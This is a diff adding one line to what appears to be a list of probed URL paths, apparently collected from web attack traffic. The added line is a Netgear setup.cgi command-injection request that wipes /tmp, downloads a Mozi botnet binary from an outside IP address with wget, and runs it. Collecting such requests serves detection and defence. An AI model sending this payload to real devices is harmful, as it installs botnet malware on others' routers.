@@ -15143,3 +15143,4 @@ http://apiv4.9hits.com/test
 /admin/modul/mod_produk/produk.php?act=111
 /edhbhxfs.php?Fox=d3wL7
 /web/.env\x1A
+/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://182.119.11.88:54495/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
